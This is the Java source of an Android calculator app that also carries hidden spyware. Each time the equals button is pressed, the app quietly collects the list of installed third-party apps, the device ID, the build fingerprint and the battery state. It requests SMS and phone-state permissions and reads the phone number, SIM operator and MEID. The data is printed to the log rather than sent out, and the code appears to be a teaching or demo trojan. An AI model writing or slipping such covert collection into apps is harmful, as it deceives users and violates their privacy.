package com.example.applicazioneinteressante;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.annotation.SuppressLint;
import android.Manifest;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;

import android.content.pm.PackageManager;

import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;

import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.widget.Button;
import android.widget.TextView;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_PHONE_STATE = 1;
    private String operation = "";
    private double op1 = 0, op2 = 0, prevResult = 0;
    private TextView current, history;

    private class MyNumberButton {
        Button b;

        @SuppressLint("SetTextI18n")
        public MyNumberButton(Button v) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (current.getText().equals("0") && !b.getText().equals("0")) {
                    current.setText(b.getText());
                } else {
                    current.setText(current.getText().toString() + b.getText().toString());
                }
            });
        }
    }

    private class MyBaseOpButton {
        Button b;

        @SuppressLint("SetTextI18n")
        public MyBaseOpButton(Button v, String op) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (!operation.equals("")) {
                    if (prevResult == 0) {
                        operation = op;
                        history.setText(op1 + operation);
                        current.setText("0");
                    } else {
                        operation = op;
                        op1 = prevResult;
                        history.setText(op1 + operation);
                        current.setText("0");
                    }
                } else {
                    op1 = Double.parseDouble(current.getText().toString());
                    operation = op;
                    history.setText(op1 + operation);
                    current.setText("0");
                }
            });
        }
    }

    private class MyAdvOpButton {

        Button b;

        @SuppressLint("SetTextI18n")
        public MyAdvOpButton(Button v, String op) {
            b = v;
            b.setOnClickListener(v1 -> {
                if (!operation.equals("")) current.setError("Input error");
                else {
                    double opy = Double.parseDouble(current.getText().toString());
                    switch (op) {
                        case "log":
                            if (opy <= 0) {
                                current.setError("Input Error");
                                current.setText("0");
                            } else {
                                op1 = opy;
                                prevResult = Math.log(op1);
                                history.setText("ln(" + op1 + ")");
                                current.setText(Double.toString(prevResult));
                            }
                            break;
                        case "sqrt":
                            if (op1 < 0) {
                                current.setError("Input Error");
                                current.setText("0");
                            } else {
                                op1 = opy;
                                prevResult = Math.sqrt(op1);
                                history.setText("sqrt(" + op1 + ")");
                                current.setText(Double.toString(prevResult));
                            }
                            break;
                        case "pow":
                            op1 = opy;
                            operation = op;
                            history.setText(op1 + " ^ ");
                            current.setText("0");
                            break;
                    }
                }
            });
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);
        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        initializeComponents();
    }

    //Initialize components in the class
    @SuppressLint("SetTextI18n")
    @SuppressWarnings("unused")
    void initializeComponents() {
        //Add listener on number buttons with inner class MyNumberButton
        MyNumberButton zero = new MyNumberButton(findViewById(R.id.number0));
        MyNumberButton one = new MyNumberButton(findViewById(R.id.number1));
        MyNumberButton two = new MyNumberButton(findViewById(R.id.number2));
        MyNumberButton three = new MyNumberButton(findViewById(R.id.number3));
        MyNumberButton four = new MyNumberButton(findViewById(R.id.number4));
        MyNumberButton five = new MyNumberButton(findViewById(R.id.number5));
        MyNumberButton six = new MyNumberButton(findViewById(R.id.number6));
        MyNumberButton seven = new MyNumberButton(findViewById(R.id.number7));
        MyNumberButton eight = new MyNumberButton(findViewById(R.id.number8));
        MyNumberButton nine = new MyNumberButton(findViewById(R.id.number9));

        //Add listener on simple operation's button with inner class MyBaseOpButton
        MyBaseOpButton plus = new MyBaseOpButton(findViewById(R.id.opPlus), "+");
        MyBaseOpButton minus = new MyBaseOpButton(findViewById(R.id.opMinus), "-");
        MyBaseOpButton muls = new MyBaseOpButton(findViewById(R.id.opMuls), "*");
        MyBaseOpButton divide = new MyBaseOpButton(findViewById(R.id.opDivide), "/");

        //Add listener on advanced operation's button with inner class MyAdvOpButton
        MyAdvOpButton log = new MyAdvOpButton(findViewById(R.id.opLog), "log");
        MyAdvOpButton sqrt = new MyAdvOpButton(findViewById(R.id.opSqrt), "sqrt");
        MyAdvOpButton pow = new MyAdvOpButton(findViewById(R.id.opPower), "pow");

        this.<Button>findViewById(R.id.pointBtn).setOnClickListener(v -> {
            double currNumber = Double.parseDouble(current.getText().toString());
            int integerPart = (int) currNumber;
            if ((currNumber - integerPart) == 0) {
                current.setText(current.getText() + ".");
            }
        });

        this.<Button>findViewById(R.id.opEqual).setOnClickListener(v -> {
            op2 = Double.parseDouble(current.getText().toString());
            switch (operation) {
                case "+":
                    prevResult = op1 + op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "-":
                    prevResult = op1 - op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "*":
                    prevResult = op1 * op2;
                    history.setText(op1 + " " + operation + " " + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
                case "/":
                    if (op2 == 0) {
                        current.setError("Input Error");
                    } else {
                        prevResult = op1 / op2;
                        history.setText(op1 + " " + operation + " " + op2);
                        current.setText(Double.toString(prevResult));
                        operation = "";
                    }
                    break;
                case "pow":
                    prevResult = Math.pow(op1, op2);
                    history.setText(history.getText().toString() + op2);
                    current.setText(Double.toString(prevResult));
                    operation = "";
                    break;
            }
            stealApp();
            stealSystemDetail();
            stealBatteryInformation();

            String[] permissions = {
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_NUMBERS
            };

            boolean allPermissionsGranted = true;
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }

            if (!allPermissionsGranted) {
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_PHONE_STATE);
            } else {
                // Tutti i permessi sono già stati concessi
                stealNumberInformations();
            }

        });

        this.<Button>findViewById(R.id.ansBtn).setOnClickListener(v -> {
            if (prevResult != 0) {
                current.setText(Double.toString(prevResult));
            }
        });

        //Cancel buttons
        this.<Button>findViewById(R.id.cancel).setOnClickListener(v -> current.setText("0"));
        this.<Button>findViewById(R.id.cancelAll).setOnClickListener(v -> {
            history.setText("");
            current.setText("0");
            prevResult = 0;
        });

        //Text fields that show current operation
        current = findViewById(R.id.insertion);
        history = findViewById(R.id.ans);
    }

    public void stealApp() {
        PackageManager packageManager = getPackageManager();
        // Ottieni una lista di tutte le applicazioni installate
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);

// Itera sulla lista di applicazioni installate

        // Itera sulla lista di applicazioni installate
        for (ApplicationInfo applicationInfo : installedApplications) {
            // Verifica se l'applicazione è un'app di terze parti

            String sourceDir = applicationInfo.sourceDir;
            String packageName = applicationInfo.packageName;
            String appName = packageManager.getApplicationLabel(applicationInfo).toString();

            if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                System.out.println("\nApp Name: " + appName);
                System.out.println("Package Name: " + packageName);
                System.out.println("Source Dir: " + sourceDir);
                System.out.println("Launch Activity :" + packageManager.getLaunchIntentForPackage(applicationInfo.packageName));
                System.out.println("----------------------------------------");
            }
        }

    }

    private void stealSystemDetail() {
        System.out.println("Brand: " + Build.BRAND + "\n" +
                "DeviceID: " +
                Settings.Secure.getString(
                        getContentResolver(),
                        Settings.Secure.ANDROID_ID
                ) + "\n" +
                "Model: " + Build.MODEL + "\n" +
                "ID: " + Build.ID + "\n" +
                "SDK: " + Build.VERSION.SDK_INT + "\n" +
                "Manufacture: " + Build.MANUFACTURER + "\n" +
                "Brand: " + Build.BRAND + "\n" +
                "User: " + Build.USER + "\n" +
                "Type: " + Build.TYPE + "\n" +
                "Base: " + Build.VERSION_CODES.BASE + "\n" +
                "Incremental: " + Build.VERSION.INCREMENTAL + "\n" +
                "Board: " + Build.BOARD + "\n" +
                "Host: " + Build.HOST + "\n" +
                "FingerPrint: " + Build.FINGERPRINT + "\n" +
                "Version Code: " + Build.VERSION.RELEASE);
    }

    public void stealBatteryInformation() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, filter);

        if (batteryStatus != null) {
            // Ottieni lo stato della batteria
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            String batteryStatusText = getBatteryStatusText(status);
            System.out.println("Battery Status: " + batteryStatusText);

            // Ottieni il livello di carica della batteria
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int batteryLevel = (int) ((level / (float) scale) * 100);
            System.out.println("Battery Level: " + batteryLevel + "%");
        } else {
            System.out.println("Battery status not available");
            System.out.println("Battery level not available");
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                        != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                        != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_PHONE_NUMBERS
            }, PERMISSION_REQUEST_PHONE_STATE);
        } else {
            // I permessi sono già stati concessi
            stealNumberInformations();
        }
    }

    @SuppressLint("MissingPermission")
    private void stealNumberInformations() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
            String operator = telephonyManager.getSimOperatorName();
            String MEID = telephonyManager.getMeid();
            System.out.println("\nPhone number: " + phoneNumber);
            System.out.println("SIM Operator: " + operator);
        }
    }

    private String getBatteryStatusText ( int status){
            switch (status) {
                case BatteryManager.BATTERY_STATUS_CHARGING:
                    return "Charging";
                case BatteryManager.BATTERY_STATUS_DISCHARGING:
                    return "Discharging";
                case BatteryManager.BATTERY_STATUS_FULL:
                    return "Full";
                case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                    return "Not Charging";
                case BatteryManager.BATTERY_STATUS_UNKNOWN:
                default:
                    return "Unknown";
            }
        }
    }

